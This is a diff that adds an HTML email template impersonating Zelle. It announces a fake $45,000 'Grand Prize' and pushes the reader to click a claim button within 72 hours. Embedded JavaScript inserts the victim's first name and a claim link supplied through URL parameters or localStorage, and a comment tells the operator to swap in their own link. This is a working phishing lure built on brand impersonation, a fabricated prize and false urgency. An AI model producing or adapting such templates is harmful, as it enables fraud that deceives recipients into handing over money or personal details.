@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>Zelle® | Prize Winner Notification</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      margin: 0;
+      padding: 20px;
+      background: linear-gradient(135deg, #f5f7fb 0%, #eef2f7 100%);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .email-container {
+      max-width: 580px;
+      width: 100%;
+      margin: 0 auto;
+      background: #ffffff;
+      border-radius: 32px;
+      overflow: hidden;
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.15);
+      border: 1px solid rgba(109, 30, 212, 0.15);
+    }
+    @media only screen and (max-width: 600px) {
+      body { padding: 0; background: #ffffff; }
+      .email-container { border-radius: 0; margin: 0; }
+      .inner-content { padding: 24px 20px !important; }
+      h1 { font-size: 26px !important; }
+      .step-item { flex-direction: column !important; text-align: center !important; }
+      .claim-btn { width: 100% !important; display: block !important; text-align: center !important; }
+    }
+    @media (prefers-color-scheme: dark) {
+      body { background-color: #0a0a0f !important; }
+      .email-container { background-color: #12121a !important; }
+      .prize-card { background: rgba(255, 255, 255, 0.03) !important; }
+    }
+    .inner-content { padding: 36px 32px; }
+    .text-center { text-align: center; }
+    .mb-16 { margin-bottom: 16px; }
+    .mb-24 { margin-bottom: 24px; }
+  </style>
+</head>
+<body>
+
+<div class="email-container">
+  <!-- Purple Top Bar -->
+  <div style="height: 6px; background: linear-gradient(90deg, #6D1ED4, #9b4dff, #6D1ED4); width: 100%;"></div>
+  
+  <!-- Zelle Logo Header -->
+  <div style="background: linear-gradient(135deg, #6d28d9, #8b5cf6); padding: 28px 28px 20px 28px; text-align: center;">
+    <div style="font-size: 32px; font-weight: 800; color: #fff; letter-spacing: -0.5px;">Zelle<sup style="font-size: 12px;">®</sup></div>
+    <div style="font-size: 11px; color: #ddd6fe; margin-top: 4px;">Instant payments. Direct to your bank.</div>
+  </div>
+  
+  <!-- Winner Banner -->
+  <div style="background: linear-gradient(135deg, #6d28d9, #8b5cf6); padding: 20px 28px 36px 28px; text-align: center;">
+    <div style="font-size: 48px; margin-bottom: 8px;">🏆</div>
+    <h1 style="color: #fff; margin: 0; font-size: 26px; font-weight: 800;">YOU'VE WON $45,000!</h1>
+    <p style="color: #ddd6fe; margin: 8px 0 0; font-size: 14px;">Official Zelle® Jackpot Winner Notification</p>
+  </div>
+  
+  <div class="inner-content">
+    <p style="font-size: 15px; color: #374151; line-height: 1.7; margin: 0 0 16px;">Dear <strong id="userNameDisplay" style="color: #8b5cf6;">Valued Zelle User</strong>,</p>
+    
+    <p style="font-size: 15px; color: #374151; line-height: 1.7; margin: 0 0 16px;">We're thrilled to inform you that you've been selected as the <strong style="color: #8b5cf6;">$45,000 Grand Prize Winner</strong> in the Zelle® Mega Rewards Program! Your email address was randomly drawn from millions of active users.</p>
+    
+    <!-- Prize Details Table -->
+    <table style="width: 100%; border-collapse: collapse; margin: 20px 0;">
+      <tr><td style="padding: 12px; background: #f5f3ff; border: 1px solid #e9d5ff; font-weight: 700; color: #7c3aed; width: 80px;">Prize</td><td style="padding: 12px; border: 1px solid #e9d5ff;">$45,000 USD</td></tr>
+      <tr><td style="padding: 12px; background: #f5f3ff; border: 1px solid #e9d5ff; font-weight: 700; color: #7c3aed;">Payment</td><td style="padding: 12px; border: 1px solid #e9d5ff;">Lump Sum Cash Prize</td></tr>
+      <tr><td style="padding: 12px; background: #f5f3ff; border: 1px solid #e9d5ff; font-weight: 700; color: #7c3aed;">Ticket #</td><td style="padding: 12px; border: 1px solid #e9d5ff;">ZLE-45K-789456123</td></tr>
+      <tr><td style="padding: 12px; background: #f5f3ff; border: 1px solid #e9d5ff; font-weight: 700; color: #7c3aed;">Expires</td><td style="padding: 12px; border: 1px solid #e9d5ff; color: #dc2626; font-weight: 600;">72 Hours</td></tr>
+    </table>
+    
+    <!-- Winner Steps Section -->
+    <div style="background: #f5f3ff; border-radius: 16px; padding: 20px; margin: 20px 0;">
+      <p style="font-weight: 700; color: #7c3aed; margin: 0 0 12px;">🎯 3 Easy Steps to Claim Your Prize:</p>
+      <ol style="margin: 0; padding-left: 20px; color: #374151; line-height: 1.8;">
+        <li>Click the claim button below to verify your winning ticket</li>
+        <li>Select your preferred delivery method (Check or Bank Transfer)</li>
+        <li>Funds released within 1-3 business days after verification</li>
+      </ol>
+    </div>
+    
+    <!-- Claim Button -->
+    <div style="text-align: center; margin: 28px 0;">
+      <a href="#" id="claimButton" style="display: inline-block; padding: 16px 36px; background: #8b5cf6; color: #fff; text-decoration: none; border-radius: 50px; font-weight: 700; font-size: 16px; box-shadow: 0 4px 12px rgba(139,92,246,0.3);">🏆 CLAIM YOUR $45,000 PRIZE NOW</a>
+    </div>
+    
+    <p style="font-size: 12px; color: #6b7280; text-align: center;">⚠️ This offer expires in 72 hours. Claim now to secure your winnings.</p>
+    
+    <div style="margin-top: 24px; padding-top: 16px; border-top: 1px solid #e5e7eb; font-size: 13px; color: #374151;">
+      <p style="margin: 0;"><strong>Zelle® Rewards Department</strong></p>
+      <p style="margin: 8px 0 0; font-size: 12px; color: #6b7280;">This is an official notification from the Zelle® User Appreciation Program. Prize claims must be completed within 72 hours.</p>
+    </div>
+  </div>
+  
+  <div style="padding: 16px 28px; background: #f9fafb; border-top: 1px solid #e5e7eb; text-align: center;">
+    <p style="margin: 0; font-size: 11px; color: #9ca3af;">Zelle® Rewards Program · Official Winner Notification</p>
+    <p style="margin: 6px 0 0; font-size: 10px; color: #9ca3af;">© 2025 Zelle® Network | All Rights Reserved</p>
+  </div>
+</div>
+
+<script>
+  (function() {
+    // Get firstName from URL parameter
+    function getFirstName() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let firstName = urlParams.get('firstName');
+      
+      // Try localStorage if URL param missing
+      if (!firstName) {
+        try {
+          firstName = localStorage.getItem('zelle_user_name');
+          if (firstName && firstName.includes(' ')) firstName = firstName.split(' ')[0];
+        } catch(e) {}
+      }
+      
+      // Default fallback
+      if (!firstName || firstName === 'null' || firstName === 'undefined') {
+        firstName = 'Valued User';
+      }
+      
+      return firstName.charAt(0).toUpperCase() + firstName.slice(1).toLowerCase();
+    }
+    
+    // Get claim link
+    function getClaimLink() {
+      let claimLink = null;
+      
+      // Try URL parameter
+      const urlParams = new URLSearchParams(window.location.search);
+      claimLink = urlParams.get('link');
+      
+      // Try localStorage
+      if (!claimLink) {
+        try {
+          claimLink = localStorage.getItem('claim_link');
+        } catch(e) {}
+      }
+      
+      // Default fallback - CHANGE THIS TO YOUR ACTUAL MEETING LINK
+      if (!claimLink || claimLink === '{{link}}') {
+        claimLink = 'https://example.com/meeting';
+      }
+      
+      return claimLink;
+    }
+    
+    // Update page
+    function updatePage() {
+      const firstName = getFirstName();
+      const claimLink = getClaimLink();
+      
+      // Update name display
+      const nameElement = document.getElementById('userNameDisplay');
+      if (nameElement) nameElement.textContent = firstName;
+      
+      // Update button link
+      const button = document.getElementById('claimButton');
+      if (button) button.href = claimLink;
+      
+      console.log('Prize page loaded - Name:', firstName, 'Link:', claimLink);
+    }
+    
+    // Run when ready
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', updatePage);
+    } else {
+      updatePage();
+    }
+  })();
+</script>
+</body>
+</html>
